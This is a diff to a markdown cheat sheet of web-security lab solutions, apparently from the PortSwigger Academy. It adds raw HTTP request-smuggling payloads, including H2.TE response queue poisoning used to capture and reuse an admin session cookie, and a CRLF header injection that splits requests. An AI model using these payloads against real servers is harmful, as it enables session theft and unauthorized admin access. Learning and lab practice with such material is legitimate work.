@@ -22,7 +22,9 @@
   * [Java](#java)
   * [PHP](#php)
 * [HTTP request smuggling Section](#http-request-smuggling-section)
-  * [Request Smuggling Via CRLF Injection](#request-smuggling-via-crlf-injection)
+  * [Response Queue Poisoning via H2.TE Request Smuggling](#response-queue-poisoning-via-h2te-request-smuggling)
+  * [Request Smuggling via CRLF Injection](#request-smuggling-via-crlf-injection)
+  * [Request Splitting via CRLF Injection](#request-splitting-via-crlf-injection)
 * [Information disclosure Section](#information-disclosure-section)
 * [Web Cache Poisoning Section](#web-cache-poisoning-cache)
   * [Web Cache Poisoning With an Unkeyed Cookie](#web-cache-poisoning-with-an-unkeyed-cookie)
@@ -213,6 +215,39 @@ For more information about payloads and stuff you can find in the ysoserial [off
 
 For manual exploitation CL.TE TE.CL we can use the [Simple HTTP Smuggler Generator CL.TE TE.CL](https://github.com/dhmosfunk/simple-http-smuggler-generator) 
 
+### Response queue poisoning via H2.TE request smuggling
+```
+POST / HTTP/2
+Host: xxx.net
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+```
+POST /x HTTP/2
+Host: xxx.net
+Transfer-Encoding: chunked
+
+0
+
+GET /x HTTP/1.1
+Host: xxx.net
+```
+"Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie."
+```
+POST /x HTTP/2
+Host: xxx.net
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/2
+Host: xxx.net
+Cookie: session=STOLEN-SESSION-COOKIE
+```
+
 ### Request smuggling via CRLF injection
 
 Add a `foo` header and from `inspector` change the value of `foo` header like below
@@ -225,7 +260,15 @@ After applying the `Transfer-Encoding` header the request will be `kettled` so y
 You request has to look like below
 ![image](https://user-images.githubusercontent.com/45040001/194731138-30e61723-6f32-4800-863a-cd4fcba39ed7.png)
 
+### Request splitting via CRLF injection
 
+Add a `foo` header and from `inspector` change the value of foo header like below
+```
+bar\r\n
+Host: 0aab009204d51605c0a31134007c0017.web-security-academy.net\r\n
+\r\n
+GET /admin HTTP/1.1
+```
 
 
 ## Information disclosure Section
